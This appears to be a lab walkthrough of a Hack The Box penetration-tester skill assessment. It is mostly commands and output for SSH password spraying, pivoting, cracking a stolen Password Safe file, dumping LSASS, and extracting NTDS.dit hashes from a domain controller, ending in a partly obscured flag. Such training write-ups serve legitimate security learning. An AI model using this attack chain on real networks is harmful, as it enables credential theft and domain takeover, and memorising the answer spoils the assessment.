### CPTS / HTB Penetration Tester Path <br>
### Skill Assessment - Password Attacks <br>
<mark>hook it up with a follow if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

## The Credential Theft Shuffle

[The Credential Theft Shuffle](https://adsecurity.org/?p=2362), as coined by `Sean Metcalf`, is a systematic approach attackers use to compromise Active Directory environments by exploiting `stolen credentials`. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to `move laterally across the network`. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and `gain control over the domain`, often by compromising Domain Admin accounts or performing DCSync attacks.

<br>

## Skills Assessment

`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller.

**In Scope IPs:**

| Host     | IP Address                                                      |
| -------- | --------------------------------------------------------------- |
| `DMZ01`  | `10.129.182.184` **(External)**, `172.16.119.13` **(Internal)** |
| `JUMP01` | `172.16.119.7`                                                  |
| `FILE01` | `172.16.119.10`                                                 |
| `DC01`   | `172.16.119.11`                                                 |

---

### Question 1:
What is the NTLM hash of NEXURA\Administrator?

Let's start with an nmap of the DMZ's external interface:
```diff
+ $ sudo nmap -sT -sC -sV -A -p 1-9999 -v 10.129.182.184
```

	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
	|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
	|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)

<br>

Looks like ssh is the only service running. We can try authenticating as Betty, but we need to figure out the company's naming convention for usernames. Since osint isn't an option here, we'll use the username-anarchy tool. Clone the repo and make a file with the name Betty Jayde in it:
```diff
+ $ ./username-anarchy -i /home/htb-ac-830862/b3tty.txt > /home/htb-ac-830862/b3ttery.txt
```

<br>

This gives us a list of different naming conventions. Now we can pass this list into hydra with the supplied password, and attempt bruteforcing it:
```diff
+ $ hydra -L /home/htb-ac-830862/b3ttery.txt -p 'Texas123!@#' ssh://10.129.182.184
```

	Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
	
	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-26 16:14:33
	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
	[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task
	[DATA] attacking ssh://10.129.182.184:22/
	
	[22][ssh] host: 10.129.182.184   login: jbetty   password: Texas123!@#
	
	1 of 1 target successfully completed, 1 valid password found

<br>

Bringo! Now we can log in as ole' Betty:
```diff
+ $ ssh jbetty@10.129.182.184
```

	jbetty@DMZ01:~$

<br>

I like to do some quick manual pillaging as soon as I'm authorized on a system, just the usual suspects like desktop, documents, bashrc/history. Here we find some loot:
```diff
+ jbetty@DMZ01:~$ cat .bash_history
```

	SNIP
	
	sshpass -p "dealer-screwed-gym1"
	ssh hwilliam@file01    
	
	cd ~
	mkdir scripts
	cd scripts
	
	chmod 755 script.sh
	
	ssh user@192.168.0.101
	scp file.txt user@192.168.0.101:~/Documents/
	
	sudo adduser testuser
	sudo usermod -aG sudo testuser
	su - testuser
	
	SNIP

<br>

All of these should be investigated, and we will keep that hwilliam username in mind. We have to setup a pivot to route our attackbox services to use the dmz as proxy, into the internal lan segment. Edit your conf file first:
```diff
+ $ sudo nano /etc/proxychains4.conf
```

And add:

	socks4 127.0.0.1 9050

<br>

Logging in with the -D and the port on proxychain config lets us route traffic through this host:
```diff
+ $ ssh -D 9050 jbetty@10.129.182.184
```

	jbetty@DMZ01:~$

<br>

Tight tight. Since we found the william creds, likely for the file server, lets do an nmap looking for tcp connects on file01, but make sure it goes through proxychain-ng. I will save you some time with port suggestions:
```diff
+ $ sudo proxychains4 -q nmap -sT -A -Pn -p 445,3389,5985 172.16.119.10 -v
```

	PORT     STATE SERVICE       VERSION
	445/tcp  open  microsoft-ds?
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	|_ssl-date: 2025-10-27T22:27:37+00:00; -27s from scanner time.
	| ssl-cert: Subject: commonName=FILE01.nexura.htb
	| Issuer: commonName=FILE01.nexura.htb
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2025-10-26T20:54:34
	| Not valid after:  2026-04-27T20:54:34
	| MD5:   d536:8d1e:0d47:095d:e16c:161e:06eb:8d73
	|_SHA-1: b7a3:2cf8:e1d9:7e01:94d7:ca61:57be:e0ac:db77:19a1
	| rdp-ntlm-info: 
	|   Target_Name: NEXURA
	|   NetBIOS_Domain_Name: NEXURA
	|   NetBIOS_Computer_Name: FILE01
	|   DNS_Domain_Name: nexura.htb
	|   DNS_Computer_Name: FILE01.nexura.htb
	|   Product_Version: 10.0.17763
	|_  System_Time: 2025-10-27T22:27:27+00:00
	5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0

<br>

WinRM, RDP, and SMB are all open. Lets just try smbclient with the creds we found earlier and the domain from the nmap:
```diff
+ $ sudo proxychains4 smbclient -L //172.16.119.10/ -U NEXURA\\hwilliam
```

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	HR              Disk      
	IPC$            IPC       Remote IPC
	IT              Disk      
	MANAGEMENT      Disk      
	PRIVATE         Disk      
	TRANSFER        Disk      

<br>

smbclient keeps disconnecting with the error 'Unable to connect with SMB1 -- no workgroup available'. But we did discover 5 interesting shares here.

A good workaround is using the smbclient.py script from impacket. It will give us a lot of useful commands to use in an interactive shell form:
```diff
+ $ sudo proxychains4 python3 /usr/share/doc/python3-impacket/examples/smbclient.py nexura.htb/hwilliam:'dealer-screwed-gym1'@172.16.119.10
```

<br>

Sadly, after downloading "Password Policy 2025.doc" from the HR/2025 share, it's not as helpful as I thought it might be for bruteforce mutations/rules.

<br>

![](/img/5.png)

<br>

However, under the 'archive' dir, we see a lot of juicy documents that could be sifted through for intel. We are looking for this:

	-rw-rw-rw-       1080  Tue Apr 29 10:25:25 2025 Employee-Passwords_OLD.psafe3

<br>

A `.psafe3` file is an encrypted password database created by Password Safe version 3, an open-source password manager. And we know john has a script just for this!

Use `get` to DL it to your CWD, then move to somewhere you'll remember it (attackbox side):
```diff
+ # get Employee-Passwords_OLD.psafe3
```
```diff
+ $ cp Employee-Passwords_OLD.psafe3 /home/htb-ac-830862/boomigotyourwallet.psafe3
```

<br>

Now I transferred this to my cracking rig via base64, but there's any number of ways you could get it to your host pc or attack box:
```diff
+ $ base64 boomigotyourwallet.psafe3 > based.b64
```
```diff
+ $ cat based.b64
```

	UFdTM4AeJZkkh65gk4cjlz9UOr19H6uB9F2hVhlLxuGXb4xZAAAEAD4dYWqPgqAlFO2IzTfxtuqz
	A9mmh8TUj74Mhmd1YXl4krTCuDN20NSF/G7BZfFzm04GAW/wdWkEbwuG/rY3ibrcrjgpDJmb+Sp0
	3WGZo6clV5jxgojyHfLdCdErT0GtdEhNDAWVFX+EhsklFu05RSNmLo0q4YEsSZrEHF5XSNZAfQoZ
	A6PZjZoUQUtp3V4SQSkvJGAUfjPiGo9qUyO8vCQhqSLKj0MofhGqQWPWqX2EljPFzc2orJ3+O9Ib
	njXrq0FZ0dlFzMEWAw7Fvpu8Sb0t94E04Gssxi9hSSOXvoT31v3vFeb0ToMeqcwbJ0YT1KjA5bm3
	cDtW+8QRfLnO3wyBJNzpivQmIwoQCoD5ktbZsOujGjz7yu77Ne1IF8bTSmZqsRhEb/wAgUTDkhQi
	tVTugx9nc1vWlusaWH9QD9jJv5g2ffyUFvT/Iw2+kAf6KKzSTnelgBNvE1ybTWQtOsghZ+2y3ZtH
	bt3DpyOqfjOworLVpIa3FKTXC6s/zvprt1WZXobhug5Rs2OYAUjAJ+oescwuI2hZRS9gpkrZpKkq
	RNdcBz+FE7SZwF/HKDkfN+g1z39JEk5bXgjUfQScWVUUBMFztoqcEoV9JQjNcW+NHjD2w8iSI3YA
	4J9me2ZgcEGLHG4AMARVHWC/rmi+pnOHfnzGMveWtZGU+7Y4OBwfI+szPjIWUHsV4BzUKpA/ndJH
	c8/6Akq8zRWK2Jj2X077NQXLmCN9BOA5dfIAbxeq47arLJkBHGS1kM7l+SqdDjZk9JeWtoPzwlti
	BQgtk+en3CD2MSI6TiFpfBJ6Di5GcPYwWU3WIo5IDRDnFbw0bDIHCmGHkIBwQfzam302Gmg5Y3iG
	Zsl8cKFYY4LDm1fb/8Bld2nCy6wPj94epybI87VvBcElkJJiwYNW+JAjGqzvZNFMX/TzaQA3L4bx
	NXH3LkjgE/9mZj5Tt1f3qKmuG1Jf2MNiv3QFMn6p1NsdfqI9j94zuh8uw+sDvbPu4p62nyLVynDr
	RZp0E+0SFMF4EPBMDxjrafMeqYeODI3GLaajlELKKGq643v5hmRx+JWIaQgvbWLoOpB2QyVC5Z1B
	LpoegUvJZm85jdnK66TRrSMOUkD2zPuMwyaH8mGifZOGY29JXa4NijvSGDiqrYzTBqCIOR20kxst
	uhyF3W4DT/doavMAusG4ipRjvO2q1o4WJBSIPLsSC0MVgeuz3jg+Sq1sLils3jIbRbQCNYGsgWT1
	UdqYViXf/5zCvh/orddpYDmIbQWSIS3uT7swMOjHdPnBdW7dx9VK+KREVLMTeSmFKf0xwfSLS7d5
	2+0qLknWUFdTMy1FT0ZQV1MzLUVPRvvZxE+LfZZWM5dBjSSbKSJda3wvr9bROLHTzuVa4duj

<br>

Verify md5 for later:
```diff
+ $ md5sum boomigotyourwallet.psafe3
```

	311499083633a801a99fd2114b3f3444  boomigotyourwallet.psafe3

<br>

Now in your cracking environment, create a file with the b64 string inside it, and then decode that file:
```diff
+ st8less@sadmin:~/Desktop/htb$ touch based.b64
+ st8less@sadmin:~/Desktop/htb$ nano based.b64
```

Add the string in nano, then verify:
```diff
+ st8less@sadmin:~/Desktop/htb$ base64 -d based.b64 > boomigotyourwallet.psafe3
```
```diff
+ st8less@sadmin:~/Desktop/htb$ md5sum boomigotyourwallet.psafe3
```

	311499083633a801a99fd2114b3f3444  boomigotyourwallet.psafe3

<br>

Now we can crack it with pwsafe2john:
```diff
+ st8less@sadmin:~/userbin/john/run$ sudo python3 pwsafe2john.py /home/st8less/Desktop/htb/boomigotyourwallet.psafe3 > 2butt2crack.txt
```

The hash inside the new file should look like this:

	boomigotyourwallet:$pwsafe$*3*801e25992487ae60938723973f543abd7d1fab81f45da156194bc6e1976f8c59*262144*3e1d616a8f82a02514ed88cd37f1b6eab303d9a687c4d48fbe0c866775617978

<br>

Finally, we crack the hash w/ a dict attack, here I used john:
```diff
+ $ john --wordlist=/mnt/SSD_DATA/SecLists/rockyou.txt /home/st8less/Desktop/htb/2butt2crack.txt
```

	Warning: detected hash type "pwsafe", but the string is also recognized as "pwsafe-opencl"
	Use the "--format=pwsafe-opencl" option to force loading these as that type instead
	Using default input encoding: UTF-8
	Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
	Cost 1 (iteration count) is 262144 for all loaded hashes
	Will run 12 OpenMP threads
	Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
	
	michaeljackson   (boomigotyourwallet)
	
	1g 0:00:00:24 DONE (2025-10-28 00:11) 0.04060g/s 498.9p/s 498.9c/s 498.9C/s 123456..havana
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed

<br>

michaeljackson, good one. Lets DL passwordsafe to access that file we exfiltrated. I'm using apt, but you can also grab the appropriate binary from their GH or SourceForge ( https://github.com/pwsafe/pwsafe/releases ).
```diff
+ $ sudo apt install passwordsafe
+ $ pwsafe
```

<br>

Now enter the path to your `boomigotyourwallet.psafe3` file, as well as the cleartext password.

You could dig through this manually, but you can also File>Export as XML for a neat, report asset for later. Here we found full creds for 4 domain users:

	jbetty      xiao-nicer-wheels5
	bdavid      caramel-cigars-reply1
	stom        fails-nibble-disturb4
	hwilliam    warned-wobble-occur8

<br>

After a quick nmap of JUMP01, we see 3389 is open. Keep in mind, your ssh -D 9050 session must still be open for proxychains to forward the traffic. Lets connect with xfreerdp. Make sure to share a folder so we can pass tools and data between hosts:
```diff
+ $ sudo proxychains4 xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /drive:mineisyours,/home/htb-ac-830862/mineisyours
```

<br>

Now that we're logged into the jumpbox as bdavid, lets see what accounts we can get from an LSASS dump. Find it in taskman, right click and create a dump. Then transfer it to your attack box with the mineisyours share.

pypykatz will extract hashes with the minidump function:
```diff
+ $ pypykatz lsa minidump lsass.DMP
```

<br>

Here we get a ton of useful data. Lets focus on the stom user, which we just found a hash for:

	== LogonSession ==
	authentication_id 266147 (40fa3)
	session_id 2
	username stom
	domainname NEXURA
	logon_server DC01
	logon_time 2025-10-28T03:58:16.321612+00:00
	sid S-1-5-21-1333759777-277832620-2286231135-1106
	luid 266147
		== MSV ==
			Username: stom
			Domain: NEXURA
			LM: NA
			NT: 21ea958524cfd9a7791737f8d2f764fa
			SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
			DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
		== WDIGEST [40fa3]==
			username stom
			domainname NEXURA
			password None
			password (hex)
		== Kerberos ==
			Username: stom
			Domain: NEXURA.HTB
		== WDIGEST [40fa3]==
			username stom
			domainname NEXURA
			password None
			password (hex)
		== DPAPI [40fa3]==
			luid 266147
			key_guid 33fbd25b-2488-49ef-9fa2-7a96959acb95
			masterkey 0528dd7d0cfa8ca48e12bf937ab2dcd92fa588f958716a9abc6fa49444b9d580a0ab3d8f7657e4a4d327fe7df824c112ec8a3d04c22f8050e669c8f256983cda
			sha1_masterkey 1cf754450d3c0515af105fd64ef952f9486495fb

<br>

We got his NT hash ( `21ea958524cfd9a7791737f8d2f764fa` ), later in the output we also see his Kerberos password:

	== Kerberos ==
			Username: stom
			Domain: NEXURA.HTB
			Password: calves-warp-learning1

<br>

With this info we can try a PtH with Tom's hash. I tried to use xfreerdp, but account restrictions were in place to thwart my efforts. Before attempting to crack the hash, I figured I'd try his kerberos password as many users reuse passwords, and voila, we're in!

Since we're now on the domain controller, and a quick `net user stom` shows us we hold the coveted DA, the endgame is now in sight. We need the NTDS.dit and the SYSTEM hive. We'll make a shadow copy of the file, which ensures we don't interrupt the Availability of it for other sys or network calls:
```diff
+ C:\Windows\system32>vssadmin CREATE SHADOW /For=C:
```

	vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
	(C) Copyright 2001-2013 Microsoft Corp.
	
	Successfully created shadow copy for 'C:\'
	    Shadow Copy ID: {7db8a36a-6d3a-4e25-8ef0-097355ec9f3b}
	    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

<br>

Take note of that path above, and use it in the next command to copy the .dit:
```diff
+ C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Users\stom\Desktop\NTDS.dit
```

	        1 file(s) copied.

<br>

Remember the NTDS is useless without the system hive:
```diff
+ C:\Windows\system32>reg.exe save hklm\system C:\Users\stom\Desktop\system.save
```

	The operation completed successfully.

<br>

Next I just dragged both of these files onto my network share so we can dump hashes on our attack box. Once they arrive, we can use impacket's secretsdump.py to reveal our shiny loot flag:
```diff
+ $ impacket-secretsdump -ntds /home/htb-ac-830862/mineisyours/NTDS.dit -system /home/htb-ac-830862/mineisyours/system.save LOCAL
```

	Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
	
	[*] Target system bootKey: 0x76b4393403c75a0cb93633c17abf2778
	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
	[*] Searching for pekList, be patient
	[*] PEK # 0 found and decrypted: 9bf8b490fffee672ecfe3bc67e0daf69
	[*] Reading and decrypting hashes from /home/htb-ac-830862/mineisyours/NTDS.dit 
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::

<br>

Congrats on the DA! Keep in mind the question is a bit misleading because it asks for the NTLM hash, when really the input only validates with the NT hash.

🚩 found **36e09e1e6ade94d63f--edit--bcab5e5b8d6d23**.
